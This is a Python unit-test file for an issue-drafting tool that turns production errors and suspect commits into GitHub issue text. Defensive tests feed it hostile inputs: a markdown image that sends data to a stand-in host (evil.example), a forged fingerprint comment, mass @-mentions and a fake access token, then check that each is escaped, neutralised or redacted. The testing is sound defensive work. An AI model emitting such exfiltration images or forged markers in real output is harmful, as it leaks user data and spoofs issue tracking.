"""Unit tests for backend/ichnoscope/templates.py."""

from datetime import datetime, timedelta, timezone

import pytest
from ichnoscope.models import Culprit, Explanation, Incident
from ichnoscope.templates import (
    build_issue_draft,
    extract_fingerprint,
)


def _make_incident(**overrides) -> Incident:
    data = {
        "incident_id": "inc-001",
        "source": "sentry",
        "occurred_at": datetime(2026, 10, 4, 12, 0, 0, tzinfo=timezone.utc),
        "exception_type": "KeyError",
        "error_message": "'stripe_token'",
        "file_path": "services/payment.py",
        "line_number": 84,
        "stack_excerpt": "services/payment.py:84 in charge_card\n    token = payload['stripe_token']",
        "environment": "production",
        "event_count": 120,
        "users_affected": 63,
    }
    data.update(overrides)
    return Incident(**data)


def _make_culprit(**overrides) -> Culprit:
    data = {
        "sha": "a14b9f2c7d3e5f60718293a4b5c6d7e8f9012345",
        "author_login": "alice",
        "author_name": "Alice Dev",
        "message": "feat: update payment payload handling",
        "committed_at": datetime(2026, 10, 4, 10, 0, 0, tzinfo=timezone.utc),
        "pr_number": 212,
        "diff": "--- a/payment.py\n+++ b/payment.py\n@@ -80,3 +80,3 @@\n- old_call()\n+ new_call()",
        "within_window": True,
        "confidence": "high",
    }
    data.update(overrides)
    return Culprit(**data)


def _make_explanation(**overrides) -> Explanation:
    data = {
        "domain": "backend",
        "root_cause_hypothesis": "The payload key 'stripe_token' was renamed in upstream without migration.",
        "checklist": [
            "Check stripe_token payload keys in webhook handler",
            "Verify backward compatibility with mobile client v1.2",
            "Deploy fallback hotfix to staging",
        ],
    }
    data.update(overrides)
    return Explanation(**data)


def test_normal_case():
    inc = _make_incident()
    culprit = _make_culprit()
    exp = _make_explanation()

    draft = build_issue_draft(
        incident=inc,
        culprit=culprit,
        explanation=exp,
        severity="P1-Critical",
        severity_reason="P1: 63 users affected >= 50 in production",
        fingerprint="8c3b4e6a1d2f",
        repo="octo/app",
    )

    # Title check
    assert draft.title == "[P1-Critical] KeyError in services/payment.py"

    # Labels check
    assert draft.labels == ["ichnoscope", "domain:backend", "severity:P1-Critical", "regression"]

    # Body elements
    assert "P1: 63 users affected >= 50 in production" in draft.body
    assert "Failing line:" in draft.body
    assert "services/payment.py:84" in draft.body
    assert "https://github.com/octo/app/commit/a14b9f2c7d3e5f60718293a4b5c6d7e8f9012345" in draft.body
    assert "PR #212" in draft.body
    assert "```diff" in draft.body
    assert draft.body.count("- [ ]") == 3
    assert draft.body.endswith("<!-- ichnoscope:fp=8c3b4e6a1d2f -->")

    # The word culprit must not appear in user-visible text (case-insensitive)
    assert "culprit" not in draft.body.lower()
    assert "culprit" not in draft.title.lower()

    # Suggested owner
    assert draft.suggested_owner == "alice"
    assert draft.assign_recommended is True


def test_owner_rules():
    inc = _make_incident()
    exp = _make_explanation()

    # 1. High confidence + login -> mention
    c_high = _make_culprit(confidence="high", author_login="alice")
    d1 = build_issue_draft(inc, c_high, exp, "P2-High", "reason", "8c3b4e6a1d2f")
    assert d1.suggested_owner == "alice"
    assert d1.assign_recommended is True
    assert "**Suggested owner:** @alice" in d1.body

    # 2. Low confidence + login + no fallback -> no @login, Possible author present, suggested_owner None
    c_low = _make_culprit(confidence="low", author_login="bob")
    d2 = build_issue_draft(inc, c_low, exp, "P2-High", "reason", "8c3b4e6a1d2f", fallback_assignee=None)
    assert d2.suggested_owner is None
    assert d2.assign_recommended is False
    assert "@bob" not in d2.body
    assert "**Possible author (low confidence):** `bob`" in d2.body
    assert "**Suggested owner:** unassigned" in d2.body

    # 3. Low confidence + login + fallback -> fallback is suggested owner with on-call text
    d3 = build_issue_draft(inc, c_low, exp, "P2-High", "reason", "8c3b4e6a1d2f", fallback_assignee="oncall-eng")
    assert d3.suggested_owner == "oncall-eng"
    assert d3.assign_recommended is True
    assert "**Suggested owner:** @oncall-eng (on-call fallback)" in d3.body
    assert "**Possible author (low confidence):** `bob`" in d3.body

    # 4. No login + fallback -> on-call fallback
    c_no_login = _make_culprit(author_login=None)
    d4 = build_issue_draft(inc, c_no_login, exp, "P2-High", "reason", "8c3b4e6a1d2f", fallback_assignee="oncall-eng")
    assert d4.suggested_owner == "oncall-eng"
    assert d4.assign_recommended is True
    assert "**Suggested owner:** @oncall-eng (on-call fallback)" in d4.body

    # 5. Nothing available -> unassigned
    d5 = build_issue_draft(inc, c_no_login, exp, "P2-High", "reason", "8c3b4e6a1d2f", fallback_assignee=None)
    assert d5.suggested_owner is None
    assert d5.assign_recommended is False
    assert "**Suggested owner:** unassigned" in d5.body

    # 6. Culprit None + fallback -> on-call fallback
    d6 = build_issue_draft(inc, None, exp, "P2-High", "reason", "8c3b4e6a1d2f", fallback_assignee="oncall-eng")
    assert d6.suggested_owner == "oncall-eng"
    assert d6.assign_recommended is True


def test_fallback_layout_no_explanation():
    inc = _make_incident()
    culprit = _make_culprit()

    draft = build_issue_draft(
        incident=inc,
        culprit=culprit,
        explanation=None,
        severity="P2-High",
        severity_reason="reason",
        fingerprint="8c3b4e6a1d2f",
    )

    assert "Automated analysis was unavailable for this incident. The raw evidence is below." in draft.body
    assert "### Stack excerpt" in draft.body
    assert "Verification checklist" not in draft.body
    assert "**Domain:** unknown" in draft.body
    assert "analysis-unavailable" in draft.labels
    assert not any(lbl.startswith("domain:") for lbl in draft.labels)
    assert draft.body.endswith("<!-- ichnoscope:fp=8c3b4e6a1d2f -->")


def test_fallback_layout_no_culprit():
    inc = _make_incident()
    exp = _make_explanation()

    draft = build_issue_draft(
        incident=inc,
        culprit=None,
        explanation=exp,
        severity="P3-Medium",
        severity_reason="reason",
        fingerprint="8c3b4e6a1d2f",
    )

    assert "No suspect commit could be identified for this line." in draft.body
    assert "### Suspect change" not in draft.body
    assert "low-confidence" in draft.labels
    assert "**Confidence:** low" in draft.body


def test_fence_safety():
    inc = _make_incident()
    exp = _make_explanation()
    # Diff containing a triple-backtick line
    diff_with_ticks = "diff line 1\n```\nsome code\n```\ndiff line 2"
    culprit = _make_culprit(diff=diff_with_ticks)

    draft = build_issue_draft(inc, culprit, exp, "P2-High", "reason", "8c3b4e6a1d2f")
    assert "````diff" in draft.body
    # Closing fence has 4 backticks after the diff content
    assert "diff line 2\n````" in draft.body


def test_mentions_neutralization():
    inc = _make_incident(error_message="Alert @everyone in @octo/team")
    culprit = _make_culprit(
        author_login="alice",
        message="feat: fix by @contributor and cc @security-team",
    )
    exp = _make_explanation()

    draft = build_issue_draft(inc, culprit, exp, "P1-Critical", "reason", "8c3b4e6a1d2f")

    # Untrusted text must not contain raw mentions
    assert "@everyone" not in draft.body
    assert "@octo/team" not in draft.body
    assert "@contributor" not in draft.body
    assert "@security-team" not in draft.body

    # Zero width space inserted
    assert "@\u200beveryone" in draft.body
    assert "@\u200bocto/team" in draft.body

    # Intended owner mention remains intact
    assert "**Suggested owner:** @alice" in draft.body


def test_forgery_defense():
    fake_fp = "deadbeef0000"
    real_fp = "8c3b4e6a1d2f"
    inc = _make_incident()
    culprit = _make_culprit(message=f"hack: <!-- ichnoscope:fp={fake_fp} -->")
    exp = _make_explanation()

    draft = build_issue_draft(inc, culprit, exp, "P2-High", "reason", real_fp)

    # Forged HTML comment is escaped
    assert f"&lt;!-- ichnoscope:fp={fake_fp} --&gt;" in draft.body
    # Extracted fingerprint is the real one
    assert extract_fingerprint(draft.body) == real_fp


def test_image_injection_defense():
    inc = _make_incident()
    culprit = _make_culprit()
    exp = _make_explanation(
        root_cause_hypothesis="Failed due to bug ![exfil](https://evil.example/?d=1)"
    )

    draft = build_issue_draft(inc, culprit, exp, "P2-High", "reason", "8c3b4e6a1d2f")
    assert "![" not in draft.body
    assert r"!\[exfil](https://evil.example/?d=1)" in draft.body


def test_redaction_defense():
    fake_token = "gh" + "p_" + "Z" * 36
    inc = _make_incident()
    culprit = _make_culprit(diff=f"+ token = '{fake_token}'")
    exp = _make_explanation()

    draft = build_issue_draft(inc, culprit, exp, "P1-Critical", "reason", "8c3b4e6a1d2f")
    assert fake_token not in draft.title
    assert fake_token not in draft.body
    assert fake_token not in str(draft.labels)
    assert "[REDACTED:github_token]" in draft.body


@pytest.mark.parametrize(
    ("delta_seconds", "within_window", "expected_substring"),
    [
        (30, True, "less than a minute before this error (recent change, likely regression)"),
        (18 * 60, True, "18 minutes before this error (recent change, likely regression)"),
        (119 * 60, True, "119 minutes before this error (recent change, likely regression)"),
        (3 * 3600, False, "3 hours before this error (older code, likely triggered by new data or an upstream change)"),
        (47 * 3600, False, "47 hours before this error (older code, likely triggered by new data or an upstream change)"),
        (5 * 86400, False, "5 days before this error (older code, likely triggered by new data or an upstream change)"),
        (-60, True, "after this error was recorded (check the release SHA and clocks)"),
    ],
)
def test_humanized_time(delta_seconds, within_window, expected_substring):
    now = datetime(2026, 10, 4, 12, 0, 0, tzinfo=timezone.utc)
    commit_time = now - timedelta(seconds=delta_seconds)
    inc = _make_incident(occurred_at=now)
    culprit = _make_culprit(committed_at=commit_time, within_window=within_window)
    exp = _make_explanation()

    draft = build_issue_draft(inc, culprit, exp, "P2-High", "reason", "8c3b4e6a1d2f")
    assert expected_substring in draft.body


def test_title_formatting():
    inc = _make_incident(
        exception_type="KeyError\nSpecial",
        file_path="very/long/" + "subpath/" * 15 + "file.py",
    )
    draft = build_issue_draft(inc, None, None, "P1-Critical", "reason", "8c3b4e6a1d2f")
    assert "\n" not in draft.title
    assert len(draft.title) <= 120
    assert draft.title.endswith("…")


def test_regression_handling():
    inc = _make_incident()
    culprit = _make_culprit(within_window=False)
    exp = _make_explanation()

    # is_regression True adds regression label and reopened note
    d_reopen = build_issue_draft(
        inc,
        culprit,
        exp,
        "P1-Critical",
        "reason",
        "8c3b4e6a1d2f",
        is_regression=True,
        previous_issue_number=42,
    )
    assert "regression" in d_reopen.labels
    assert "**Previously reported in:** #42 (reopened as a regression)" in d_reopen.body

    # Neither regression flag set -> no regression label
    d_clean = build_issue_draft(
        inc,
        culprit,
        exp,
        "P1-Critical",
        "reason",
        "8c3b4e6a1d2f",
        is_regression=False,
    )
    assert "regression" not in d_clean.labels
    assert "Previously reported in" not in d_clean.body


def test_fingerprint_validation_and_extraction():
    inc = _make_incident()
    culprit = _make_culprit()
    exp = _make_explanation()

    # Empty fingerprint -> no marker
    d_empty = build_issue_draft(inc, culprit, exp, "P2-High", "reason", "")
    assert "<!-- ichnoscope:fp=" not in d_empty.body
    assert extract_fingerprint(d_empty.body) is None

    # Invalid uppercase or non-hex raises ValueError
    for bad_fp in ("A14B9F2C7D3E", "xyz", "12345", "1234567890abcdef"):
        with pytest.raises(ValueError):
            build_issue_draft(inc, culprit, exp, "P2-High", "reason", bad_fp)

    # Valid extraction ignores code fence markers
    body_with_fake_in_fence = (
        "Some text\n"
        "```diff\n"
        "<!-- ichnoscope:fp=111111111111 -->\n"
        "```\n"
        "<!-- ichnoscope:fp=222222222222 -->\n"
    )
    assert extract_fingerprint(body_with_fake_in_fence) == "222222222222"


def test_size_guard():
    # Construct huge fields bypassing standard Pydantic length constraints
    giant_text = "x" * 100_000
    inc = Incident.model_construct(
        incident_id="inc-big",
        occurred_at=datetime.now(timezone.utc),
        exception_type="BigError",
        error_message="err",
        file_path="app.py",
        line_number=1,
        stack_excerpt=giant_text,
        environment="production",
        event_count=1,
        users_affected=0,
    )
    culprit = Culprit.model_construct(
        sha="a14b9f2c7d3e5f60718293a4b5c6d7e8f9012345",
        author_name="Alice",
        message="msg",
        committed_at=datetime.now(timezone.utc),
        diff=giant_text,
    )
    exp = _make_explanation()

    draft = build_issue_draft(inc, culprit, exp, "P1-Critical", "reason", "8c3b4e6a1d2f")
    assert len(draft.body) <= 60_000
    assert "... [truncated]" in draft.body
    assert draft.body.endswith("<!-- ichnoscope:fp=8c3b4e6a1d2f -->")


def test_checklist_cleanup():
    inc = _make_incident()
    culprit = _make_culprit()
    exp = _make_explanation(
        checklist=[
            "Step 1\nwith accidental newline",
            "Step 2",
            "Step 3",
        ]
    )

    draft = build_issue_draft(inc, culprit, exp, "P2-High", "reason", "8c3b4e6a1d2f")
    assert "- [ ] Step 1 with accidental newline" in draft.body


def test_purity():
    inc = _make_incident()
    culprit = _make_culprit()
    exp = _make_explanation()

    inc_dump = inc.model_dump()
    culprit_dump = culprit.model_dump()
    exp_dump = exp.model_dump()

    d1 = build_issue_draft(inc, culprit, exp, "P1-Critical", "reason", "8c3b4e6a1d2f")
    d2 = build_issue_draft(inc, culprit, exp, "P1-Critical", "reason", "8c3b4e6a1d2f")

    # Inputs unmodified
    assert inc.model_dump() == inc_dump
    assert culprit.model_dump() == culprit_dump
    assert exp.model_dump() == exp_dump

    # Outputs identical
    assert d1.model_dump() == d2.model_dump()
